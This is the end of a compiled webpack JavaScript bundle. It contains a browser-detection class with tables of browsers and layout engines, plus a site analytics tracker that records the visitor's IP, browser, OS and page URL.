                ],
                "cost": "Free, $20 (Pro)",
                "status": "Active",
                "licence": [
                    {
                        "name": "Proprietary (browser)",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Proprietary_software"
                    },
                    {
                        "name": "LGPL (WebKit)",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/GNU_Lesser_General_Public_License"
                    }
                ],
                "layout": [
                    {
                        "name": "WebKit",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/WebKit"
                    }
                ],
                "latest-release": [
                    {
                        "version": "5.9.2",
                        "date": "March 4, 2020"
                    }
                ]
            },
            "curl": {
                "name": "Client URL",
                "type": "Web Browser",
                "ui": "FullTextMode",
                "creator": [
                    {
                        "name": "Daniel Stenberg",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Daniel_Stenberg"
                    }
                ],
                "cost": "Free",
                "status": "Active",
                "licence": [
                    {
                        "name": "Free Software: MIT\/X derivate license",
                        "link": "https:\/\/curl.haxx.se\/docs\/copyright.html"
                    }
                ],
                "latest-release": {
                    "Stable release": {
                        "version": "7.73.0",
                        "date": "14 October 2020"
                    }
                }
            },
            "Lynx": {
                "name": "Lynx",
                "type": "FTP client \/ HTTP client",
                "ui": "TextBasedMode",
                "creator": [
                    {
                        "name": "Montulli, Grobe, Rezac, et al"
                    }
                ],
                "cost": "Free",
                "status": "Active",
                "licence": [
                    {
                        "name": "GPL",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/GNU_General_Public_License"
                    }
                ],
                "layout": [
                    {
                        "name": "custom, fork of libwww",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Libwww"
                    }
                ],
                "latest-release": [
                    {
                        "version": "2.8.9rel.1",
                        "date": "8 July 2018"
                    }
                ]
            },
            "msie": "msie",
            "Midori": {
                "name": "Midori Browser",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "Christian Dywan, et al.",
                        "link": "https:\/\/astian.org\/en\/midori-browser\/"
                    }
                ],
                "cost": "Free",
                "status": "Active",
                "licence": [
                    {
                        "name": "LGPL",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/GNU_Lesser_General_Public_License"
                    }
                ],
                "layout": [
                    {
                        "name": "WebKit",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/WebKit"
                    }
                ],
                "latest-release": {
                    "Stable release": [],
                    "Preview release": {
                        "version": "9.0",
                        "date": "July 29, 2019"
                    }
                }
            },
            "NetSurf": {
                "name": "NetSurf Browser",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "The NetSurf Developers",
                        "link": "http:\/\/www.netsurf-browser.org\/"
                    }
                ],
                "cost": "Free",
                "status": "Active",
                "licence": [
                    {
                        "name": "GPL",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/GNU_General_Public_License"
                    }
                ],
                "layout": [
                    {
                        "name": "Qt WebEngine",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Qt_WebEngine"
                    },
                    {
                        "name": "QtWebKit",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/QtWebKit"
                    }
                ],
                "latest-release": {
                    "Stable release": {
                        "version": "3.10",
                        "date": "May 24, 2020"
                    },
                    "Preview release": []
                }
            },
            "Otter": {
                "name": "Otter Browser",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "Micha\u0142 Dutkiewicz",
                        "link": "https:\/\/otter-browser.org\/"
                    }
                ],
                "cost": "Free",
                "status": "Active",
                "licence": [
                    {
                        "name": "GPLv3",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/GNU_General_Public_License"
                    }
                ],
                "layout": [
                    {
                        "name": "Qt WebEngine",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Qt_WebEngine"
                    },
                    {
                        "name": "QtWebKit",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/QtWebKit"
                    }
                ],
                "latest-release": {
                    "Stable release": {
                        "version": "1.0.01",
                        "date": "1 January 2019"
                    },
                    "Preview release": {
                        "version": "weekly333",
                        "date": "May 18, 2020"
                    }
                }
            },
            "Maxthon": {
                "name": "Maxthon Browser",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "Maxthon International Ltd",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Maxthon"
                    }
                ],
                "cost": "\tFree",
                "status": "Active",
                "licence": [
                    {
                        "name": "Freeware",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Freeware"
                    }
                ],
                "layout": [
                    {
                        "name": "WebKit",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/WebKit"
                    },
                    {
                        "name": "Trident",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Trident_(layout_engine)"
                    }
                ],
                "latest-release": {
                    "Windows": {
                        "version": "5.3.8.2000",
                        "date": "October 25, 2019"
                    },
                    "Android": {
                        "version": "5.2.3.3241",
                        "date": "January 25, 2019"
                    },
                    "macOS": {
                        "version": "5.1.60",
                        "date": "August 27, 2018"
                    },
                    "iOS": {
                        "version": "5.4.5",
                        "date": "July 21, 2020"
                    },
                    "Windows Phone": {
                        "version": "2.2.0",
                        "date": "March 30, 2017"
                    },
                    "Linux": {
                        "version": "1.0.5.3",
                        "date": "September 9, 2014"
                    }
                }
            },
            "safari": {
                "name": "safari Browser",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "Apple Inc.",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Apple_Inc."
                    }
                ],
                "cost": "Included with macOS and iOS",
                "status": "Active",
                "licence": [
                    {
                        "name": "Proprietary (browser)",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Proprietary_software"
                    },
                    {
                        "name": "LGPL (WebKit) ",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/GNU_Lesser_General_Public_License"
                    }
                ],
                "layout": [
                    {
                        "name": "WebKit",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/WebKit"
                    }
                ],
                "latest-release": {
                    "macOS": {
                        "version": "14.0",
                        "date": "September 17, 2020"
                    },
                    "iOS": {
                        "version": "14.0",
                        "date": "September 17, 2020"
                    }
                }
            }
        };
        /*Web Browser Layout engines List*/ /*
             * Layout engines
             *
             * Gecko is developed by the Mozilla Foundation.
             * Goanna is a fork of Gecko developed by Moonchild Productions.
             * KHTML is developed by the KDE project.
             * Presto was developed by Opera Software for use in Opera. Development stopped as Opera transitioned to Blink.
             * Tasman was developed by Microsoft for use in Internet Explorer 5 for Macintosh.
             * Trident is developed by Microsoft for use in the Windows versions of Internet Explorer 4 to Internet Explorer 11.
             * EdgeHTML is the engine developed by Microsoft for Edge. It is a largely rewritten fork of Trident with all legacy code removed.
             * WebKit is a fork of KHTML by Apple Inc. used in Apple Safari, and formerly in Chromium and Google Chrome.
             * Blink is a 2013 fork of WebKit's WebCore component by Google used in Chromium, Google Chrome, Microsoft Edge, Opera, and Vivaldi.[19]
             * Servo is an experimental web browser layout engine being developed cooperatively by Mozilla and Samsung.*/
        this.webBrowserLayoutList = {
            "EdgeHTML": {
                "name": "EdgeHTML",
                "developer": "Microsoft",
                "contain": "Edg",
                "contain_example": "Edge\/xyz"
            },
            "Blink": {
                "name": "Blink",
                "developer": "Google",
                "contain": "Chrome",
                "contain_example": "Chrome\/xyz"
            },
            "Gecko": {
                "name": "Gecko",
                "developer": "Mozilla Foundation",
                "contain": "Gecko",
                "contain_example": "Gecko\/xyz"
            },
            "Goanna": {
                "name": "Goanna",
                "developer": "Moonchild Productions",
                "contain": "Goanna",
                "contain_example": "Goanna\/xyz"
            },
            "KHTML": {
                "name": "KHTML",
                "developer": "KDE project",
                "contain": "KHTML",
                "contain_example": "KHTML\/xyz"
            },
            "Presto": {
                "name": "Presto",
                "developer": "Opera Software",
                "contain": "Opera",
                "contain_example": "Opera\/xyz"
            },
            "Tasman": {
                "name": "Tasman",
                "developer": "Microsoft",
                "contain": "Tasman",
                "contain_example": "Tasman\/xyz"
            },
            "Trident": {
                "name": "Trident",
                "developer": "Microsoft",
                "contain": "Trident",
                "contain_example": "Trident\/xyz"
            },
            "WebKit": {
                "name": "WebKit",
                "developer": "Apple Inc",
                "contain": "AppleWebKit",
                "contain_example": "AppleWebKit\/xyz"
            },
            "Servo": {
                "name": "Servo",
                "developer": "cooperatively by Mozilla and Samsung",
                "contain": "Servo",
                "contain_example": "Servo\/xyz"
            },
            "libwww-FM": {
                "name": "libwww-FM",
                "developer": "Tim Berners-Lee",
                "contain": "libwww-FM",
                "contain_example": "libwww-FM\/xyz"
            }
        };
        /*Parent App of Browser*/
        this.webBrowserAppCodeNameList = [{ 'name': 'mozilla', 'code': 'Mozilla' }];
        /** update db
         *
         * const self = this;
         /!*devices list*!/
         this.GetUpdatedData("http://localhost/libraries/json/browser-devices-list.json", function (updatedList: any) {
            self.devicesList = updatedList;
        });
         /!*device's architecture list*!/
         this.GetUpdatedData("http://localhost/libraries/json/browser-devices-architecture-list.json", function (updatedList: any) {
            self.devicesArchitectureList = updatedList;
        });
         /!*devices category list*!/
         this.GetUpdatedData("http://localhost/libraries/json/browser-devices-category-list.json", function (updatedList: any) {
            self.devicesCategoryList = updatedList;
        });
         /!*devices platform window manager list*!/
         this.GetUpdatedData("http://localhost/libraries/json/browser-devices-platform-wmn-list.json", function (updatedList: any) {
            self.devicesPlatformWMNameList = updatedList;
        });
         /!*browsers list*!/
         this.GetUpdatedData("http://localhost/libraries/json/browser-all-list.json", function (updatedList: any) {
            self.webBrowserList = updatedList;
        });
         /!*browsers app code list*!/
         this.GetUpdatedData("http://localhost/libraries/json/browser-app-code-list.json", function (updatedList: any) {
            self.webBrowserAppCodeNameList = updatedList;
        });
         /!*browsers layout list*!/
         this.GetUpdatedData("http://localhost/libraries/json/browser-layout-list.json", function (updatedList: any) {
            self.webBrowserAppCodeNameList = updatedList;
        });*/
        this.analyze();
    }
    /*private GetUpdatedData(Url: string, callback: any) {
        sendRequest({
            method: "POST",
            url: Url,
            async: true,
        }, function (data: any) {
            try {
                if (JSON.parse(data)) {
                    if (callback) {
                        callback(JSON.parse(data));
                    }
                }
            } catch (e) {
                console.error("Unable to retrieve data from " + Url);
                console.error(e);
            }
        });
    }*/
    Browser.prototype.analyze = function () {
        /*start operation*/
        var self = this;
        var cleanUA = self.cleanUserAgentString(this.UserAgent);
        /*first step*/
        if (Array.isArray(self.webBrowserAppCodeNameList)) {
            self.webBrowserAppCodeNameList.forEach(function (value) {
                /*search app code form user-agent*/
                if (cleanUA.indexOf(value.name.toLowerCase()) !== -1) {
                    self.browserAppName = value.code;
                    /*split user-agent in to array by space*/
                    cleanUA.split(" ").forEach(function (item) {
                        if (item.indexOf(value.name.toLowerCase()) !== -1) {
                            self.browserAppNameFull = item.replace("/", " ").replace(value.name, value.code);
                            console.log(self.browserAppNameFull);
                            self.browserAppVersion = item.substr(value.name.toLowerCase().length + 1, (item.length - (value.name.toLowerCase().length + 1)));
                            console.log(self.browserAppVersion);
                        }
                    });
                }
            });
        }
        /*second step*/
        /*self.devicesPlatformWMNameList.forEach(function (wm:any){

        })*/
    };
    /**
     * @public
     * @return string
     */
    Browser.prototype.getURLProtocol = function () {
        return this.URLProtocol;
    };
    /**
     * @public
     * @return string
     */
    Browser.prototype.getURLHostname = function () {
        return this.URLHostname;
    };
    /**
     * @public
     * @return string
     */
    Browser.prototype.getURLPath = function () {
        return this.URLPath;
    };
    /**
     * @public
     * @return string
     */
    Browser.prototype.getURLPathFull = function () {
        return this.URLPathFull;
    };
    /**
     * @public
     * @return number
     */
    Browser.prototype.gerDeviceScreenHeight = function () {
        return this.DeviceScreenHeight;
    };
    /**
     * @public
     * @return number
     */
    Browser.prototype.gerDeviceScreenWidth = function () {
        return this.DeviceScreenWidth;
    };
    /**
     * @public
     * @return number
     */
    Browser.prototype.gerDeviceScreenColorDepth = function () {
        return this.DeviceScreenColorDepth;
    };
    /**
     * @public
     * @return number
     */
    Browser.prototype.gerDeviceScreenPixelDepth = function () {
        return this.DeviceScreenPixelDepth;
    };
    /**
     * @public
     * @return string
     */
    Browser.prototype.getDeviceWmNameOriginal = function () {
        return this.deviceWmNameOriginal;
    };
    /**
     * @public
     * @return array
     */
    Browser.prototype.getDeviceInfoAll = function () {
        return this.deviceInfoAll;
    };
    /**
     * @public
     * @return mixed
     */
    Browser.prototype.getUserAgent = function () {
        return this.UserAgent;
    };
    Browser.prototype.getDeviceList = function () {
        return this.devicesList;
    };
    Browser.prototype.getArchitectureList = function () {
        return this.devicesArchitectureList;
    };
    Browser.prototype.getBrowserAppCodeNameList = function () {
        return this.webBrowserAppCodeNameList;
    };
    Browser.prototype.getWebBrowserList = function () {
        return this.webBrowserList;
    };
    Browser.prototype.getWebBrowserLayoutList = function () {
        return this.webBrowserLayoutList;
    };
    Browser.prototype.getPlatformWMNameList = function () {
        return this.devicesPlatformWMNameList;
    };
    Browser.prototype.getDevicesCategoryList = function () {
        return this.devicesCategoryList;
    };
    /**
     * @public
     * @return array
     */
    Browser.prototype.getUserAgentList = function () {
        return this.UserAgentList;
    };
    /**
     * @public
     * @return string
     */
    Browser.prototype.getBrowserEngineName = function () {
        return (this.browserEngineName).trim();
    };
    /**
     * @public
     * @return string
     */
    Browser.prototype.getBrowserEngineNameFull = function () {
        return (this.browserEngineNameFull).trim();
    };
    /**
     * @public
     * @return array
     */
    Browser.prototype.getBrowserInfoAll = function () {
        return this.browserInfoAll;
    };
    /**
     * @public
     * @return string
     */
    Browser.prototype.getBrowserAppCodeName = function () {
        return (this.browserAppCodeName).trim();
    };
    /**
     * @public
     * @return string
     */
    Browser.prototype.getBrowserAppCodeVersion = function () {
        return (this.browserAppCodeVersion).trim();
    };
    /**
     * @public
     * @return string
     */
    Browser.prototype.getBrowserAppName = function () {
        return (this.browserAppName).trim();
    };
    /**
     * @public
     * @return string
     */
    Browser.prototype.getBrowserAppCodeNameFull = function () {
        return (this.browserAppName).trim();
    };
    /**
     * @public
     * @return string
     */
    Browser.prototype.getBrowserAppVersion = function () {
        return (this.browserAppVersion).trim();
    };
    /**
     * @public
     * @return string
     */
    Browser.prototype.getBrowserArchitecture = function () {
        return (this.browserArchitecture).trim();
    };
    /**
     * @public
     * @return string
     */
    Browser.prototype.getBrowserEngineVersion = function () {
        return (this.browserEngineVersion).trim();
    };
    /**
     * @public
     * @return string
     */
    Browser.prototype.getBrowserName = function () {
        return (this.browserName).trim();
    };
    Browser.prototype.getBrowserNameFull = function () {
        return (this.browserNameFull).trim();
    };
    /**
     * @public
     * @return string
     */
    Browser.prototype.getBrowserVersion = function () {
        return (this.browserVersion).trim();
    };
    /**
     * @public
     * @return string
     */
    Browser.prototype.getBrowserVersionFull = function () {
        return (this.browserVersionFull).trim();
    };
    /**
     * @public
     * @return mixed
     */
    Browser.prototype.getCurrentDeviceInfo = function () {
        return this.currentDeviceInfo;
    };
    /**
     * @public
     * @return string
     */
    Browser.prototype.getDeviceName = function () {
        return (this.deviceName).trim();
    };
    /**
     * @public
     * @return string
     */
    Browser.prototype.getDeviceNameFull = function () {
        return (this.deviceNameFull).trim();
    };
    /**
     * @public
     * @return string
     */
    Browser.prototype.getDeviceNameOriginal = function () {
        return (this.deviceNameOriginal).trim();
    };
    /**
     * @public
     * @return string
     */
    Browser.prototype.getDeviceType = function () {
        return (this.deviceType).trim();
    };
    /**
     * @public
     * @return string
     */
    Browser.prototype.getDeviceArchitecture = function () {
        return (this.deviceArchitecture).trim();
    };
    /**
     * @public
     * @return string
     */
    Browser.prototype.getDeviceWindowManager = function () {
        return (this.deviceWindowManager).trim();
    };
    Browser.prototype.gtDeviceDetails = function (resources) {
        //array_change_key_case($age,CASE_UPPER)
        if (Array.isArray(resources) && (resources).length > 0) {
            if ('Platform' in resources) {
                this.currentDeviceInfo = resources['Platform'];
                this.deviceName = resources['Platform']['name'];
                this.deviceArchitecture = resources['Platform']['architecture'];
                this.deviceType = resources['Device']['type'];
            }
            else {
                if (typeof resources === 'string') {
                    this.deviceName = resources;
                    this.deviceType = resources;
                    this.currentDeviceInfo = resources;
                }
            }
        }
    };
    Browser.prototype.getPlatformName = function () {
        return this.deviceName;
    };
    Browser.prototype.getPlatformArchitecture = function () {
        return this.deviceArchitecture;
    };
    Browser.prototype.cleanUserAgentString = function (UserAgent) {
        // clean up the string
        // replace browser names with their aliases
        return UserAgent.toLowerCase().trim().replace('opr', 'opera').replace('iceweasel', 'firefox');
    };
    return Browser;
}());



/***/ })

/******/ });
/************************************************************************/
/******/ // The module cache
/******/ var __webpack_module_cache__ = {};
/******/ 
/******/ // The require function
/******/ function __webpack_require__(moduleId) {
/******/ 	// Check if module is in cache
/******/ 	var cachedModule = __webpack_module_cache__[moduleId];
/******/ 	if (cachedModule !== undefined) {
/******/ 		return cachedModule.exports;
/******/ 	}
/******/ 	// Create a new module (and put it into the cache)
/******/ 	var module = __webpack_module_cache__[moduleId] = {
/******/ 		// no module.id needed
/******/ 		// no module.loaded needed
/******/ 		exports: {}
/******/ 	};
/******/ 
/******/ 	// Execute the module function
/******/ 	__webpack_modules__[moduleId](module, module.exports, __webpack_require__);
/******/ 
/******/ 	// Return the exports of the module
/******/ 	return module.exports;
/******/ }
/******/ 
/************************************************************************/
/******/ /* webpack/runtime/define property getters */
/******/ !function() {
/******/ 	// define getter functions for harmony exports
/******/ 	__webpack_require__.d = function(exports, definition) {
/******/ 		for(var key in definition) {
/******/ 			if(__webpack_require__.o(definition, key) && !__webpack_require__.o(exports, key)) {
/******/ 				Object.defineProperty(exports, key, { enumerable: true, get: definition[key] });
/******/ 			}
/******/ 		}
/******/ 	};
/******/ }();
/******/ 
/******/ /* webpack/runtime/hasOwnProperty shorthand */
/******/ !function() {
/******/ 	__webpack_require__.o = function(obj, prop) { return Object.prototype.hasOwnProperty.call(obj, prop); }
/******/ }();
/******/ 
/******/ /* webpack/runtime/make namespace object */
/******/ !function() {
/******/ 	// define __esModule on exports
/******/ 	__webpack_require__.r = function(exports) {
/******/ 		if(typeof Symbol !== 'undefined' && Symbol.toStringTag) {
/******/ 			Object.defineProperty(exports, Symbol.toStringTag, { value: 'Module' });
/******/ 		}
/******/ 		Object.defineProperty(exports, '__esModule', { value: true });
/******/ 	};
/******/ }();
/******/ 
/************************************************************************/
var __webpack_exports__ = {};
// This entry need to be wrapped in an IIFE because it need to be isolated against other modules in the chunk.
!function() {
/*!********************************!*\
  !*** ./typescripts/tracker.ts ***!
  \********************************/
__webpack_require__.r(__webpack_exports__);
/* harmony import */ var _resources_typescripts_db_app__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! @/resources/typescripts/db/app */ "./typescripts/db/app.ts");
/* harmony import */ var _resources_typescripts_common_request__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! @/resources/typescripts/common/request */ "./typescripts/common/request.ts");
/* harmony import */ var _resources_typescripts_mishusoft_browser__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! @/resources/typescripts/mishusoft/browser */ "./typescripts/mishusoft/browser.ts");
/* harmony import */ var _resources_typescripts_mishusoft_Tracker__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! @/resources/typescripts/mishusoft/Tracker */ "./typescripts/mishusoft/Tracker.ts");




Promise.resolve(/*! import() */).then(__webpack_require__.bind(__webpack_require__, /*! ./db/app */ "./typescripts/db/app.ts"))
    .then(function (db) {
    function initDb() {
        if (window.sessionStorage) {
            if (window.sessionStorage.getItem("ip") === null) {
                (0,_resources_typescripts_common_request__WEBPACK_IMPORTED_MODULE_1__.sendRequest)({
                    method: "GET",
                    url: db.app.website.ipInfoDedicated,
                    async: true,
                    header: [{ name: "Accept", value: "application/json" }],
                }, function (IpDataReply) {
                    window.sessionStorage.setItem("ip", JSON.parse(IpDataReply).ip);
                });
            }
        }
        else {
            console.error("Error:: Your browser does not support session!! Please upgrade or change your browser!!");
        }
    }
    /*new tracker added*/
    initDb();
    var appVersion = db.app.default.version;
    var appTracker = db.app.default.name + "@" + appVersion;
    Promise.resolve(/*! import() */).then(__webpack_require__.bind(__webpack_require__, /*! ./mishusoft/browser */ "./typescripts/mishusoft/browser.ts"))
        .then(function (module) {
        var browser = new module.Browser();
        var osNameArch = browser.getPlatformName() + " " + browser.getPlatformArchitecture();
        var browserFullName = browser.getBrowserNameFull();
        Promise.resolve(/*! import() */).then(__webpack_require__.bind(__webpack_require__, /*! ./mishusoft/Tracker */ "./typescripts/mishusoft/Tracker.ts"))
            .then(function (t) {
            new t.Tracker(window.location.href, appTracker, appVersion, osNameArch, browserFullName).init(function () {
                t.Tracker.send({
                    command: "saveNavigateData",
                    data: {
                        username: "visitor",
                        workWebsite: window.location.origin,
                    },
                });
            });
        })
            .catch(function (err) {
            console.log(err);
        });
    })
        .catch(function (err) {
        console.log(err);
    });
    /*new tracker added*/
})
    .catch(function (err) {
    console.log(err);
});
/*new tracker added*/
function initDb() {
    if (window.sessionStorage) {
        if (window.sessionStorage.getItem("ip") === null) {
            (0,_resources_typescripts_common_request__WEBPACK_IMPORTED_MODULE_1__.sendRequest)({
                method: "GET",
                url: _resources_typescripts_db_app__WEBPACK_IMPORTED_MODULE_0__.app.website.ipInfoDedicated,
                async: true,
                header: [{ name: "Accept", value: "application/json" }],
            }, function (IpDataReply) {
                window.sessionStorage.setItem("ip", JSON.parse(IpDataReply).ip);
            });
        }
    }
    else {
        console.error("Error:: Your browser does not support session!! Please upgrade or change your browser!!");
    }
}
initDb();
var appVersion = _resources_typescripts_db_app__WEBPACK_IMPORTED_MODULE_0__.app["default"].version;
var appTracker = _resources_typescripts_db_app__WEBPACK_IMPORTED_MODULE_0__.app["default"].name + "@" + appVersion;
var browser = new _resources_typescripts_mishusoft_browser__WEBPACK_IMPORTED_MODULE_2__.Browser();
var osNameArch = browser.getPlatformName() + " " + browser.getPlatformArchitecture();
var browserFullName = browser.getBrowserNameFull();
new _resources_typescripts_mishusoft_Tracker__WEBPACK_IMPORTED_MODULE_3__.Tracker(window.location.href, appTracker, appVersion, osNameArch, browserFullName).init(function () {
    _resources_typescripts_mishusoft_Tracker__WEBPACK_IMPORTED_MODULE_3__.Tracker.send({
        command: "saveNavigateData",
        data: {
            username: "visitor",
            workWebsite: window.location.origin,
        },
    });
});
/*new tracker added*/

}();

//# sourceMappingURL=data:application/json;charset=utf-8;base64,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